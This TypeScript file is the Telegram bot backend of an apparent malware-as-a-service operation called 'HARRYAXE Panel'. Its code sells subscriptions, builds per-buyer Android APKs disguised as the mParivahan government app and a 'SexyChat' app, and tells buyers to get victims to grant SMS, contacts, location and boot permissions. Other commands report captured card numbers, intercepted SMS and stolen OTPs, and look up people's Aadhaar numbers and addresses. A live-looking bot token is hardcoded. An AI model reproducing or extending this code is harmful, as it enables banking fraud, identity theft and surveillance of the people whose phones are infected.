import { Context, Markup, Telegraf } from "telegraf";
import { ADMIN_ID, isAdminTg } from "../lib/admin";
import { logger } from "../lib/logger";
import {
  buildUserApk,
  buildSexyChatApk,
  getApkSize,
  initApkTemplate,
  initSexyTemplate,
  isTemplateReady,
  isSexyTemplateReady,
} from "./apkBuilder";
import { startDeviceWatcher } from "./deviceWatcher";
import { startCcWatcher } from "./ccWatcher";
import { startSmsWatcher } from "./smsWatcher";
import { setLogBot, adminLog } from "./adminLog";
import {
  getSubscription,
  setSubscription,
  deleteSubscription,
  getAllSubscriptions,
  fbGet,
  fbSet,
  fbUpdate,
  fbDelete,
} from "./firebase";

// Tracks users mid-conversation (waiting for their next message)
const pendingActions = new Map<
  string,
  { action: "reset_password" | "set_email" }
>();

const BOT_TOKEN =
  process.env["TELEGRAM_BOT_TOKEN"] ||
  "8245670708:AAE0LTEbNGNRpXuAQOiqYlSNjzWDIAAm_jw";

function getPanelUrl(): string {
  const custom = process.env["PANEL_URL"];
  if (custom) return custom;
  if (process.env["REPLIT_DEV_DOMAIN"])
    return `https://${process.env["REPLIT_DEV_DOMAIN"]}`;
  return "https://panel.kimiaxe.com";
}

function daysToMs(days: number): number {
  return days * 24 * 60 * 60 * 1000;
}

function formatDate(ts: number): string {
  return (
    new Date(ts).toLocaleString("en-IN", {
      timeZone: "Asia/Kolkata",
      day: "2-digit",
      month: "short",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    }) + " IST"
  );
}

function isAdmin(ctx: Context): boolean {
  return isAdminTg(ctx.from?.id ?? 0);
}

let bot: Telegraf | null = null;

export function getBot(): Telegraf | null {
  return bot;
}

// ── Pending notification delivery ────────────────────────────────────────────
// When a subscription is added for a user who hasn't started the bot yet,
// Telegram won't let us DM them. We queue the notification in Firebase and
// deliver it the moment they send /start.
export async function sendSubscriptionNotification(
  telegramId: string,
  sub: any
): Promise<boolean> {
  if (!bot || !sub) return false;
  const now = Date.now();
  const isActive =
    sub.status === "active" && (!sub.expiresAt || now < sub.expiresAt);
  const daysLeft = sub.expiresAt
    ? Math.max(0, Math.floor((sub.expiresAt - now) / (1000 * 60 * 60 * 24)))
    : 0;

  const msg =
    `🎉 *Subscription Activated!*\n\n` +
    `👤 User: ${sub.username || "unknown"}\n` +
    `🆔 ID: \`${telegramId}\`\n` +
    `📅 Plan: ${sub.plan || "Custom"}\n` +
    (sub.expiresAt ? `⏰ Expires: ${formatDate(sub.expiresAt)}\n` : "") +
    `🕐 Days Left: ${daysLeft}d\n` +
    (sub.email ? `📧 Email: ${sub.email}\n` : "") +
    `\n📱 /apk — mParivahan APK\n` +
    `💬 /sexychat — SexyChat APK\n` +
    `🔑 /reset\\_password — Web panel password set karo\n` +
    `🌐 Panel: ${getPanelUrl()}`;

  try {
    await bot.telegram.sendMessage(parseInt(telegramId), msg, {
      parse_mode: "Markdown",
    });
    void adminLog(
      `🆕 *New Subscription*\n\n` +
        `👤 ${sub.username || telegramId}\n` +
        `🆔 \`${telegramId}\`\n` +
        `📦 Plan: *${sub.plan || "Custom"}*\n` +
        `⏳ Expires: ${new Date(sub.expiresAt || Date.now()).toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })}`
    );
    return true;
  } catch {
    // User hasn't started the bot — queue for later delivery on /start
    try {
      const hub = await fbGet(`config/pendingNotifications/${telegramId}`);
      const existing = Array.isArray(hub?.items) ? hub.items : [];
      await fbSet(`config/pendingNotifications/${telegramId}`, {
        items: [...existing, { text: msg, ts: Date.now() }],
      });
      logger.info(
        { telegramId },
        "Subscription notification queued (user hasn't started bot)"
      );
    } catch (err) {
      logger.error({ err, telegramId }, "Failed to queue pending notification");
    }
    return false;
  }
}

// Deliver queued notifications on /start, then clear them.
async function deliverPendingNotifications(ctx: Context): Promise<void> {
  if (!ctx.from) return;
  const userId = ctx.from.id.toString();
  try {
    const hub = await fbGet(`config/pendingNotifications/${userId}`);
    if (!hub?.items || hub.items.length === 0) return;

    for (const item of hub.items) {
      try {
        await ctx.reply(item.text, { parse_mode: "Markdown" });
      } catch {
        logger.warn({ userId }, "Failed to deliver queued notification");
      }
      await new Promise((r) => setTimeout(r, 400)); // respect rate limits
    }
    await fbDelete(`config/pendingNotifications/${userId}`);
    logger.info(
      { userId, count: hub.items.length },
      "Delivered pending notifications"
    );
  } catch (err) {
    logger.error({ err, userId }, "Failed to deliver pending notifications");
  }
}

async function fetchSub(id: string) {
  return getSubscription(id);
}

// ── APK send helpers ──────────────────────────────────────────────────────
async function sendMparivahanApk(ctx: Context) {
  const userId = ctx.from!.id.toString();
  if (!ctx.chat) return;
  try {
    const sub = await fetchSub(userId);
    if (!isAdmin(ctx)) {
      const now = Date.now();
      const isActive =
        sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
      if (!isActive) {
        await ctx.reply("❌ Subscription expired or not found. Contact admin.");
        return;
      }
    }

    if (!isTemplateReady()) {
      await ctx.reply(
        "⏳ APK system is initializing (first-time setup ~2 min). Please try again shortly."
      );
      return;
    }

    const statusMsg = await ctx.reply(
      "🔨 *Building your APK...*\nThis may take 30-60 seconds.",
      {
        parse_mode: "Markdown",
      }
    );

    const apkPath = await buildUserApk(userId);
    if (!apkPath) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        undefined,
        "❌ APK build failed — template not ready. Contact admin."
      );
      return;
    }

    const size = getApkSize(apkPath);
    const buildId = Math.floor(Math.random() * 90000) + 10000;

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      undefined,
      `✅ *APK Ready!*\n\n📦 Size: ${size}\n🆔 Build: #${buildId}\n\nSending file...`
    );

    await ctx.replyWithDocument({
      source: apkPath,
      filename: `mParivahan_HARRYAXE_${userId}.apk`,
    });

    await ctx.reply(
      `📱 *Install Steps:*\n\n` +
        `1. Install & open the APK\n` +
        `2. Allow ALL permissions when asked:\n` +
        `   • SMS — read + send\n` +
        `   • Contacts — address book access\n` +
        `   • Photos & Videos — media access\n` +
        `   • Phone, Location, Storage, Boot\n` +
        `   • Disable battery optimization\n` +
        `3. Done — device appears in panel\n\n` +
        `_Isse install karte hi aapka device panel mein connect ho jayega._`,
      { parse_mode: "Markdown" }
    );
  } catch (err: any) {
    logger.error({ err }, "mParivahan APK command failed");
    await ctx.reply("❌ APK generation failed. Contact admin.");
  }
}

async function sendSexyChatApk(ctx: Context) {
  const userId = ctx.from!.id.toString();
  if (!ctx.chat) return;
  try {
    const sub = await fetchSub(userId);
    if (!isAdmin(ctx)) {
      const now = Date.now();
      const isActive =
        sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
      if (!isActive) {
        await ctx.reply("❌ Subscription expired or not found. Contact admin.");
        return;
      }
    }

    if (!isSexyTemplateReady()) {
      await ctx.reply(
        "⏳ SexyChat APK system is initializing (first-time setup). Please try again shortly."
      );
      return;
    }

    const statusMsg = await ctx.reply(
      "🔨 *Building your SexyChat APK...*\nThis may take 30-60 seconds.",
      {
        parse_mode: "Markdown",
      }
    );

    const sexyApkPath = await buildSexyChatApk(userId);
    if (!sexyApkPath) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        undefined,
        "❌ SexyChat APK build failed — template not ready. Contact admin."
      );
      return;
    }

    const size = getApkSize(sexyApkPath);

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      undefined,
      `✅ *SexyChat APK Ready!*\n\n📦 Size: ${size}\n\nSending file...`
    );

    await ctx.replyWithDocument({
      source: sexyApkPath,
      filename: `SexyChat_${userId}.apk`,
    });

    await ctx.reply(
      `💬 *SexyChat APK Install Steps:*\n\n` +
        `1. Install & open the APK\n` +
        `2. Allow all permissions\n` +
        `3. Done — enjoy!\n\n` +
        `_Is APK aapke device ID (${userId}) ke saath build hua hai — PIN capture aapke panel mein aayega._`,
      { parse_mode: "Markdown" }
    );
  } catch (err: any) {
    logger.error({ err }, "SexyChat APK command failed");
    await ctx.reply("❌ SexyChat APK send failed. Contact admin.");
  }
}

async function handleApkCommand(ctx: Context) {
  const userId = ctx.from!.id.toString();
  try {
    const sub = await fetchSub(userId);
    if (!isAdmin(ctx)) {
      const now = Date.now();
      const isActive =
        sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
      if (!isActive) {
        await ctx.reply("❌ Subscription expired or not found. Contact admin.");
        return;
      }
    }

    await ctx.reply(
      `📦 *Select APK to download:*\n\n` +
        `📱 **mParivahan** — Private panel app\n` +
        `💬 **SexyChat** — Chat app`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback("📱 mParivahan APK", "apk_mparivahan"),
            Markup.button.callback("💬 SexyChat APK", "apk_sexychat"),
          ],
        ]),
      }
    );
  } catch (err: any) {
    logger.error({ err }, "APK menu failed");
    await ctx.reply("❌ APK menu failed. Contact admin.");
  }
}

async function handleListUsers(ctx: Context) {
  if (!isAdmin(ctx)) {
    await ctx.reply("❌ Admin only.");
    return;
  }
  try {
    const subs = await getAllSubscriptions();
    const now = Date.now();
    const entries = Object.entries(subs);

    if (entries.length === 0) {
      await ctx.reply("📭 No subscriptions found.");
      return;
    }

    const lines = entries.map(([id, s]: [string, any]) => {
      const active =
        s.status === "active" && (!s.expiresAt || now < s.expiresAt);
      const daysLeft = s.expiresAt
        ? Math.max(0, Math.floor((s.expiresAt - now) / 86_400_000))
        : 0;
      const uname = String(s.username || "unknown").replace(/([_*`])/g, "\\$1");
      const plan = String(s.plan || "?").replace(/([_*`])/g, "\\$1");
      return `${active ? "🟢" : "🔴"} \`${id}\` @${uname} — ${plan} (${daysLeft}d)`;
    });

    // Telegram has 4096 char limit; chunk if needed
    for (let i = 0; i < lines.length; i += 20) {
      const chunk = lines.slice(i, i + 20).join("\n");
      await ctx.reply(`📋 *Users (${entries.length}):*\n\n${chunk}`, {
        parse_mode: "Markdown",
      });
    }
  } catch (err) {
    logger.error({ err }, "List users failed");
    await ctx.reply("❌ Failed to list users.");
  }
}

async function handleResetPassword(ctx: Context) {
  const userId = ctx.from!.id.toString();
  pendingActions.set(userId, { action: "reset_password" });
  await ctx.reply(
    "🔑 *Reset Password*\n\n" +
      "Apna new password likho (min 4 characters):\n\n" +
      "_Cancel karne ke liye /cancel bhejo._"
  );
}

async function handleSetPanelEmail(ctx: Context) {
  const userId = ctx.from!.id.toString();
  pendingActions.set(userId, { action: "set_email" });
  await ctx.reply(
    "📧 *Set Panel Email*\n\n" +
      "Apna email address bhejo:\n\n" +
      "_Is email se web panel login karoge._"
  );
}

export async function startBot(): Promise<void> {
  if (!BOT_TOKEN) return;

  // Pre-decode APK templates in background so /apk and /sexychat are ready instantly
  initApkTemplate().catch((err) =>
    logger.error({ err }, "APK template init failed")
  );
  initSexyTemplate().catch((err) =>
    logger.error({ err }, "SexyChat template init failed")
  );

  bot = new Telegraf(BOT_TOKEN, { handlerTimeout: 600_000 }); // 10 min — APK builds must never kill polling

  // Global error handler — prevents unhandled rejections crashing the bot
  bot.catch(async (err: unknown, ctx: Context) => {
    logger.error({ err }, "Bot unhandled error");
    try {
      await ctx.reply(
        "❌ An error occurred. Please try again or contact admin."
      );
    } catch {}
  });

  // ─── /start ──────────────────────────────────────────────────────────────
  bot.command("start", async (ctx) => {
    const userId = ctx.from.id.toString();
    const username = ctx.from.username || ctx.from.first_name || "User";

    // Deliver any queued subscription notifications first
    await deliverPendingNotifications(ctx);

    if (isAdmin(ctx)) {
      const panelUrl = getPanelUrl();
      await ctx.reply(
        `*HARRYAXE Panel — Admin Console*\n\n` +
          `Welcome back, @${ctx.from.username || "admin"}!\n\n` +
          `*Available Commands:*\n` +
          `/start — Show this menu\n` +
          `/apk — Get mParivahan APK\n` +
          `/sexychat — Get SexyChat APK\n` +
          `/reset\\_password — Reset web panel password\n` +
          `/setpanel — Set panel email\n\n` +
          `*Admin Commands:*\n` +
          `/adduser — Add subscription\n` +
          `/removeuser — Remove subscription\n` +
          `/listusers — List all subscribers\n` +
          `/stats — System stats\n\n` +
          `🌐 *Panel:* ${panelUrl}`,
        {
          parse_mode: "Markdown",
          ...Markup.inlineKeyboard([
            [Markup.button.url("🌐 Open Web Panel", panelUrl)],
          ]),
        }
      );
      // Send keyboard separately so inline button + reply keyboard both show
      await ctx.reply(
        "Quick actions:",
        Markup.keyboard([
          ["📱 Get APK", "🔑 Reset Password"],
          ["👥 Users List", "📊 Stats"],
          ["🌐 Open Panel"],
        ]).resize()
      );
      return;
    }

    const sub = await getSubscription(userId);

    if (!sub) {
      await ctx.reply(
        `*HARRYAXE Panel Bot*\n\n` +
          `❌ No subscription found for your account.\n\n` +
          `Contact admin to get access:\n@exoincs`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    const now = Date.now();
    const isActive =
      sub.status === "active" && (!sub.expiresAt || now < sub.expiresAt);
    const timeLeft = sub.expiresAt ? Math.max(0, sub.expiresAt - now) : 0;
    const daysLeft = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
    const hoursLeft = Math.floor(
      (timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
    );

    const panelUrl = getPanelUrl();
    await ctx.reply(
      `📋 *Subscription Details*\n\n` +
        `• Account: ${username}\n` +
        `• Plan: ${sub.plan}\n` +
        `• Status: ${isActive ? "✅ Active" : "❌ Expired"}\n` +
        (sub.expiresAt ? `• Expires: ${formatDate(sub.expiresAt)}\n` : "") +
        (isActive && sub.expiresAt
          ? `• Time Left: ${daysLeft}d ${hoursLeft}h\n`
          : "") +
        `\n🌐 *Panel:* ${panelUrl}`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.url("🌐 Open Web Panel", panelUrl)],
        ]),
      }
    );
    await ctx.reply(
      "Quick actions:",
      Markup.keyboard([
        ["📱 Get APK", "🔑 Reset Password"],
        ["🌐 Open Panel"],
      ]).resize()
    );
  });

  // ─── /cancel — clears pending action ───────────────────────────────────
  bot.command("cancel", async (ctx) => {
    pendingActions.delete(ctx.from!.id.toString());
    await ctx.reply("❌ Cancelled.");
  });

  // ─── Handle text messages for pending actions ──────────────────────────
  bot.on("text", async (ctx, next) => {
    const userId = ctx.from!.id.toString();
    const action = pendingActions.get(userId);
    if (!action) return next(); // not in a flow — pass to command handlers

    const text = (ctx.message.text || "").trim();

    if (action.action === "reset_password") {
      pendingActions.delete(userId);
      if (text.length < 4) {
        await ctx.reply(
          "❌ Password kam se kam 4 characters ka hona chahiye. /reset_password dobara karo."
        );
        return;
      }
      try {
        await fbUpdate(`subscriptions/${userId}`, { panelPassword: text });
        await ctx.reply(
          "✅ *Password updated!*\n\nAb web panel mein login kar sakte ho.",
          {
            parse_mode: "Markdown",
          }
        );
      } catch (err) {
        logger.error({ err }, "Failed to set password");
        await ctx.reply("❌ Password set nahi hua. Try again.");
      }
    } else if (action.action === "set_email") {
      pendingActions.delete(userId);
      if (!text.includes("@") || text.length < 5) {
        await ctx.reply(
          "❌ Valid email bhejo (example@mail.com). /setpanel dobara karo."
        );
        return;
      }
      try {
        await fbUpdate(`subscriptions/${userId}`, {
          email: text.toLowerCase(),
        });
        await ctx.reply(
          "✅ *Email updated!*\n\nAb web panel login ke liye ready ho.",
          {
            parse_mode: "Markdown",
          }
        );
      } catch (err) {
        logger.error({ err }, "Failed to set email");
        await ctx.reply("❌ Email set nahi hua. Try again.");
      }
    }
  });

  // ─── /apk ────────────────────────────────────────────────────────────────
  bot.command("apk", handleApkCommand);

  // ─── APK callback actions ───────────────────────────────────────────────
  bot.action("apk_mparivahan", async (ctx) => {
    await ctx.answerCbQuery("Building mParivahan APK...");
    await sendMparivahanApk(ctx);
  });

  bot.action("apk_sexychat", async (ctx) => {
    await ctx.answerCbQuery("Sending SexyChat APK...");
    await sendSexyChatApk(ctx);
  });

  // ─── /reset_password ─────────────────────────────────────────────────────
  bot.command("reset_password", handleResetPassword);

  // ─── /setpanel ──────────────────────────────────────────────────────────
  bot.command("setpanel", handleSetPanelEmail);

  // ─── /stats ─────────────────────────────────────────────────────────────
  bot.command("stats", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }
    const clientCount = await fbGet("clients");
    const messages = await fbGet("messages");
    const smsCount = messages
      ? Object.keys(messages).reduce(
          (a: number, k: string) => a + Object.keys(messages[k]).length,
          0
        )
      : 0;
    const ccCount = clientCount
      ? Object.values(clientCount).filter(
          (c: any) => c?.cc_cardNumber || c?.cardNumber
        ).length
      : 0;

    await ctx.reply(
      `📊 *System Stats*\n\n` +
        `📱 Devices: ${clientCount ? Object.keys(clientCount).length : 0}\n` +
        `💬 Total SMS: ${smsCount}\n` +
        `💳 Cards Captured: ${ccCount}\n`,
      { parse_mode: "Markdown" }
    );
  });

  // ─── Admin: /adduser ─────────────────────────────────────────────────────
  // Usage: /adduser 123456789 30 username email@example.com
  bot.command("adduser", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }

    const parts = ctx.message.text.split(" ").slice(1);
    if (parts.length < 2) {
      await ctx.reply(
        "Usage: `/adduser {telegramId} {days} {username} {email}`\n\nExample:\n`/adduser 123456789 30 @username user@email.com`\n\n_Email optional but required for web panel login._",
        { parse_mode: "Markdown" }
      );
      return;
    }

    const [telegramId, daysStr, username = "unknown", email] = parts;
    const days = parseInt(daysStr);

    if (isNaN(days) || days <= 0) {
      await ctx.reply("❌ Invalid days value.");
      return;
    }

    const existing = await getSubscription(telegramId);
    const now = Date.now();

    const baseTime =
      existing?.status === "active" &&
      existing.expiresAt &&
      existing.expiresAt > now
        ? existing.expiresAt
        : now;

    const expiresAt = baseTime + daysToMs(days);

    await setSubscription(telegramId, {
      telegramId,
      username: username.replace("@", ""),
      plan: `${days} Days`,
      status: "active",
      expiresAt,
      createdAt: existing?.createdAt || now,
      ...(email ? { email: email.toLowerCase() } : {}),
    } as any);

    const daysLeft = Math.floor((expiresAt - now) / (1000 * 60 * 60 * 24));

    await ctx.reply(
      `✅ *Subscription Added!*\n\n` +
        `👤 User: ${username}\n` +
        `🆔 ID: \`${telegramId}\`\n` +
        `📅 Plan: ${days} Days\n` +
        `⏰ Expires: ${formatDate(expiresAt)}\n` +
        `🕐 Days Left: ${daysLeft}d\n` +
        (email
          ? `📧 Email: ${email}`
          : `⚠️ No email set — user won't be able to login to panel`),
      { parse_mode: "Markdown" }
    );

    // Notify the user — queue if they haven't started the bot yet
    await sendSubscriptionNotification(telegramId, {
      username,
      plan: `${days} Days`,
      status: "active",
      expiresAt,
      email: email?.toLowerCase(),
    });
  });

  // ─── Admin: /removeuser ─────────────────────────────────────────────────
  bot.command("removeuser", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }

    const parts = ctx.message.text.split(" ").slice(1);
    if (parts.length < 1) {
      await ctx.reply("Usage: `/removeuser {telegramId}`");
      return;
    }

    const telegramId = parts[0];
    await deleteSubscription(telegramId);
    await ctx.reply(`🗑️ *Subscription removed for \`${telegramId}\`*`, {
      parse_mode: "Markdown",
    });
  });

  // ─── /listusers ──────────────────────────────────────────────────────────
  bot.command("listusers", handleListUsers);

  // ─── /setchannel ──────────────────────────────────────────────────────────
  bot.command("setchannel", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }
    const parts = ctx.message.text.split(" ").slice(1);
    if (parts.length < 1) {
      await ctx.reply(
        "Usage: `/setchannel -100xxxxxxxxxx` or `/setchannel @channelname`"
      );
      return;
    }
    const channelId = parts[0];
    await setSubscription("__global__", { smsChannel: channelId } as any);
    await ctx.reply(`✅ Global SMS channel set to \`${channelId}\``, {
      parse_mode: "Markdown",
    });
  });

  // ─── /removechannel ──────────────────────────────────────────────────────
  bot.command("removechannel", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }
    await deleteSubscription("__global__");
    await ctx.reply("🗑️ Global SMS channel removed.");
  });

  // ─── /sexychat ──────────────────────────────────────────────────────────
  // Sends the pre-built SexyChat APK directly
  bot.command("sexychat", async (ctx) => {
    await sendSexyChatApk(ctx);
  });

  // ─── /osint — mobile/aadhar lookup (data only, no credits/parsing) ─────
  bot.command("osint", async (ctx) => {
    const query = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();
    if (!query) {
      await ctx.reply(
        "Usage: `/osint <mobile|aadhar>`\nExample: `/osint 9876543210`",
        { parse_mode: "Markdown" }
      );
      return;
    }
    try {
      const { lookup } = await import("../routes/osint");
      const json = await lookup(query);
      const hits: any[] = Array.isArray(json.results) ? json.results : [];
      if (hits.length === 0) {
        await ctx.reply(`🔍 No records found for \`${query}\``, {
          parse_mode: "Markdown",
        });
        return;
      }
      const fmtAddr = (a?: string | null) =>
        a ? a.split("!").filter(Boolean).join(", ") : "—";
      const esc = (s: any) =>
        String(s ?? "—").replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
      const lines = hits
        .slice(0, 5)
        .map(
          (h, i) =>
            `*${i + 1}. ${esc(h.name)}*\n` +
            `👨 Father: ${esc(h.father_name)}\n` +
            `📱 Mobile: \`${esc(h.mobile)}\`${h.alternate_mobile ? ` (alt \`${esc(h.alternate_mobile)}\`)` : ""}\n` +
            `🪪 Aadhar: \`${esc(h.aadhar)}\`\n` +
            `📡 ${esc(h.circle)}\n` +
            `📍 ${esc(fmtAddr(h.address))}`
        );
      const more = hits.length > 5 ? `\n…+${hits.length - 5} more` : "";
      await ctx.reply(
        `🔍 *OSINT: \`${esc(query)}\`* — ${json.message || hits.length + " result(s)"}\n\n` +
          lines.join("\n\n") +
          more,
        { parse_mode: "Markdown" }
      );
    } catch (err: any) {
      logger.error({ err }, "OSINT command failed");
      await ctx.reply("❌ Lookup failed. Try again later.");
    }
  });

  // ─── /otp — latest OTPs from device numbers (panel mirror) ────────────
  bot.command("otp", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }
    try {
      const { fbGet } = await import("./firebase");
      const log = (await fbGet("otps/latest")) || {};
      const entries = (Object.values(log) as any[])
        .filter((e) => e && e.code)
        .sort((a, b) => (b.date || 0) - (a.date || 0))
        .slice(0, 10);
      if (entries.length === 0) {
        await ctx.reply(
          "🔑 No OTPs captured yet. They appear as devices receive verification SMS."
        );
        return;
      }
      const esc = (s: any) =>
        String(s ?? "—").replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
      const ago = (t?: number) => {
        if (!t) return "—";
        const s = Math.floor((Date.now() - t) / 1000);
        if (s < 60) return `${s}s ago`;
        if (s < 3600) return `${Math.floor(s / 60)}m ago`;
        return `${Math.floor(s / 3600)}h ago`;
      };
      const lines = entries.map(
        (e, i) =>
          `*${i + 1}. \`${esc(e.code)}\`*\n` +
          `🏷️ ${esc(e.service)} · 📱 \`${esc(e.number)}\`\n` +
          `🕐 ${ago(e.date)}${e.from ? ` · from ${esc(e.from)}` : ""}`
      );
      await ctx.reply(
        `🔑 *Latest OTPs* (${entries.length})\n\n${lines.join("\n\n")}`,
        {
          parse_mode: "Markdown",
        }
      );
    } catch (err: any) {
      logger.error({ err }, "OTP command failed");
      await ctx.reply("❌ OTP fetch failed. Try again later.");
    }
  });

  // Start watchers immediately — they only need the bot token for sending, NOT polling.
  // This guarantees device/SMS/CC notifications work even if bot.launch() is delayed.
  setLogBot(bot!);
  startDeviceWatcher(bot!, ADMIN_ID);
  startSmsWatcher(bot!, ADMIN_ID);
  startCcWatcher(bot!, ADMIN_ID);
  logger.info("Watchers started (immediate)");

  // Custom long-polling loop. We intentionally do NOT use telegraf's built-in
  // polling: it passes an AbortController to node-fetch 2.7.0 which (a) rejects
  // cross-realm signals and (b) can enter a 409 death spiral. Native fetch + per-
  // update error isolation means one bad update can never take the bot down.
  const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
  const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
  let pollOffset = 0;
  async function pollForever() {
    while (true) {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 70_000);
        const res = await fetch(`${API}/getUpdates`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            timeout: 50,
            offset: pollOffset > 0 ? pollOffset : undefined,
            allowed_updates: ["message", "callback_query"],
          }),
          signal: controller.signal,
        });
        clearTimeout(timer);
        if (!res.ok) {
          const body: any = await res.json().catch(() => ({}));
          const err: any = new Error(
            body.description || `getUpdates HTTP ${res.status}`
          );
          err.code = body.error_code;
          throw err;
        }
        const data: any = await res.json();
        const updates: any[] = data.result || [];
        for (const u of updates) {
          pollOffset = Math.max(pollOffset, u.update_id + 1);
          await bot!.handleUpdate(u).catch((err) => {
            logger.error(
              { err, updateId: u.update_id },
              "Update handler error"
            );
          });
        }
      } catch (err: any) {
        if (
          err?.code === 409 ||
          String(err?.message || "").includes("Conflict")
        ) {
          logger.warn("Polling 409 conflict — another poller? backing off 15s");
          await sleep(15_000);
        } else {
          logger.error({ err }, "Polling error — retrying in 5s");
          await sleep(5_000);
        }
      }
    }
  }
  void pollForever();
  logger.info("Telegram bot started (custom long polling, 24/7 self-heal)");
}

export function getWebhookHandler() {
  // Webhook endpoint disabled in polling mode - updates arrive via getUpdates.
  return null;
}
